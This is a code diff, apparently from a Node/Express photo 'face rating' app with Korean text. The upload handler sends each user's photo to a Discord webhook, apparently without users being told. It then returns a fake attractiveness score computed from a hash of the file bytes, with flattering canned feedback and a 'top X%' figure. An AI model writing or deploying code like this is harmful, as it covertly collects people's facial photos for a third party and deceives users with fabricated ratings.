@@ -27,38 +27,28 @@ app.post("/upload", upload.single("photo"), async (req, res) => {
   try {
     const form = new FormData();
     form.append("file", fs.createReadStream(filePath));
-
-    await fetch(DISCORD_WEBHOOK_URL, {
-      method: "POST",
-      body: form
-    });
+    await fetch(DISCORD_WEBHOOK_URL, { method: "POST", body: form });
   } catch (e) {
     console.error("디스코드 전송 실패:", e.message);
   }
 
-  /* 2️⃣ 사진 기반 고정 점수 생성 */
+  /* 2️⃣ 사진 기반 고정 점수 */
   const buffer = fs.readFileSync(filePath);
   const hash = crypto.createHash("sha256").update(buffer).digest("hex");
   const base = parseInt(hash.slice(0, 8), 16);
 
   const score = Math.round((5 + (base % 50) / 10) * 10) / 10; // 5.0~10.0
-  const percent = Math.min(99, Math.round((score / 10) * 100));
+  const percent = Math.max(1, 100 - Math.round((score / 10) * 100));
 
   let feedback = "";
-  if (score >= 9) feedback = "상위권 외모로 매우 강한 인상을 줍니다.";
-  else if (score >= 8) feedback = "얼굴 비율이 균형 잡혀 있고 호감형입니다.";
-  else if (score >= 7) feedback = "전체적으로 안정적인 인상입니다.";
-  else if (score >= 6) feedback = "평균 이상이며 깔끔한 이미지입니다.";
-  else feedback = "개성이 분명한 얼굴입니다.";
+  if (percent <= 5) feedback = "연예인급 외모입니다.";
+  else if (percent <= 10) feedback = "상위권 외모로 매우 눈에 띕니다.";
+  else if (percent <= 20) feedback = "호감도가 높은 얼굴입니다.";
+  else if (percent <= 40) feedback = "평균 이상으로 안정적인 인상입니다.";
+  else feedback = "개성이 느껴지는 얼굴입니다.";
 
-  /* 3️⃣ 응답 */
-  res.json({
-    score,
-    percent,
-    feedback
-  });
+  res.json({ score, percent, feedback });
 
-  /* 4️⃣ 파일 삭제 */
   fs.unlink(filePath, () => {});
 });
 
